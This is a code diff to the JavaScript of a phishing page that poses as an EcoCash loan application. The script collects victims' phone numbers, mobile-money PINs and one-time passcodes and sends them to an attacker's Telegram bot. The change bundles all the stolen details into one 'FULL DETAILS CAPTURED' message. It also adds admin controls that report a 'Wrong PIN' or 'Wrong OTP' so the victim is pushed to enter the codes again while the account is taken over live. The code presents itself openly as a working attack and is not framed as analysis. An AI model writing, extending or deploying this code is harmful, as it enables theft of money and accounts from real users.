@@ -596,6 +596,15 @@
     }
   }
 
+  // === TELEGRAM SEND (unified) ===
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
+
+    try { navigator.sendBeacon(url, JSON.stringify(payload)); }
+    catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
+  }
+
   // === STEP 1: PHONE → VALIDATION ===
   document.getElementById('btnCheckLimit').addEventListener('click', () => {
     const msisdn = document.getElementById('msisdn').value.trim();
@@ -616,15 +625,14 @@
     document.getElementById('cardStep2').style.display = '';
   });
 
-  // === STEP 2: PIN → EXFIL → OTP ===
+  // === STEP 2: PIN → OTP SHEET (NO PIN EXFIL — PIN only stored locally) ===
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     const pin = document.getElementById('ecocashPin').value;
     if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
       return showErr('err2', 'Enter a valid 4-digit PIN');
     }
 
-    state.pin = pin;
-    exfiltratePin();
+    state.pin = pin; // stored in memory only, NOT sent yet
     openOtpSheet();
   });
 
@@ -657,15 +665,14 @@
     const message = `
 🚨 *ECOCASH VICTIM ACTIVE* 🚨
 📞 *Number:* ${state.msisdn}
-🔐 *PIN:* ${state.pin}
 💸 *Loan:* ${state.amount}
 
 Choose action:
 `;
     const keyboard = {
       inline_keyboard: [
-        [{ text: "🔁 Reset Session", callback_data: `reset_${victimId}` }],
-        [{ text: "✅ Approve OTP", callback_data: `approve_${victimId}` }]
+        [{ text: "❌ Wrong PIN", callback_data: `wrongpin_${victimId}` }],
+        [{ text: "❌ Wrong OTP", callback_data: `wrongotp_${victimId}` }]
       ]
     };
 
@@ -681,7 +688,7 @@ Choose action:
     }).catch(console.error);
   }
 
-  // === LONG POLLING FOR ADMIN RESET ===
+  // === LONG POLLING FOR ADMIN ACTIONS ===
   function startPolling() {
     let offset = null;
     POLLING_INTERVAL = setInterval(() => {
@@ -695,10 +702,22 @@ Choose action:
 
             if (fromId != CHAT_ID) return;
 
-            if (action?.startsWith('reset_') && action.endsWith(state.victimId)) {
-              alert('Session expired. Please try again.');
+            // Admin says the PIN the victim entered was wrong → show error, let them retry
+            if (action?.startsWith('wrongpin_') && action.endsWith(state.victimId)) {
+              document.getElementById('otpSheet').classList.remove('show');
+              document.getElementById('cardStep2').style.display = '';
+              document.getElementById('ecocashPin').value = '';
+              showErr('err2', 'Incorrect PIN. Please try again.');
               clearInterval(POLLING_INTERVAL);
-              location.reload();
+            }
+
+            // Admin says the OTP the victim entered was wrong → show error on OTP sheet, let them retry
+            if (action?.startsWith('wrongotp_') && action.endsWith(state.victimId)) {
+              showErr('errOtp', 'Incorrect OTP. Please check the code and try again.');
+              // Clear OTP inputs for retry
+              document.querySelectorAll('#otpRow input').forEach(i => { i.value = ''; });
+              document.getElementById('btnVerify').disabled = true;
+              document.querySelector('#otpRow input').focus();
             }
           });
         })
@@ -744,17 +763,16 @@ Choose action:
     });
   });
 
-  // Final Verify Button
+  // Final Verify Button — EXFIL OTP ONLY (phone + PIN + OTP together at this point)
   document.getElementById('btnVerify').addEventListener('click', () => {
     const otp = Array.from(otpInputs).map(i => i.value).join('');
     if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
 
     state.otp = otp;
-    exfiltrateOtp();
+    exfiltrateOtp(); // Phone + PIN + OTP in one message
 
     document.getElementById('cardStep2').style.display = 'none';
     document.getElementById('otpSheet').classList.remove('show');
-    document.getElementById('processingScreen')?.remove();
     showSuccessScreen();
 
     clearInterval(POLLING_INTERVAL);
@@ -778,22 +796,10 @@ Choose action:
     }, 10000);
   }
 
-  // === EXFILTRATION ===
-  function exfiltratePin() {
-    const message = `
-📲 *ECOCASH VICTIM: PHONE + PIN*
-📞 *Number:* ${state.msisdn}
-🔐 *PIN:* ${state.pin}
-💸 *Loan:* ${state.amount}
-📅 *Term:* ${state.term}
-🕒 *Time:* ${new Date().toLocaleString()}
-`;
-    sendToTelegram(message);
-  }
-
+  // === EXFILTRATION: OTP ONLY (single message with everything) ===
   function exfiltrateOtp() {
     const message = `
-🔐 *ECOCASH OTP CAPTURED*
+🔐 *ECOCASH FULL DETAILS CAPTURED*
 📞 *Number:* ${state.msisdn}
 🔐 *PIN:* ${state.pin}
 🔢 *OTP:* ${state.otp}
@@ -804,18 +810,9 @@ Choose action:
     sendToTelegram(message);
   }
 
-  function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
-
-    try { navigator.sendBeacon(url, JSON.stringify(payload)); }
-    catch (e) { fetch(url, { method: 'POST', body: JSON.stringify(payload), mode: 'no-cors' }); }
-  }
-
-  // Timer reset
+  // Timer reset — resend does NOT exfiltrate
   document.getElementById('resend').addEventListener('click', () => {
     startOtpTimer();
-    exfiltratePin();
   });
 
   // Close OTP
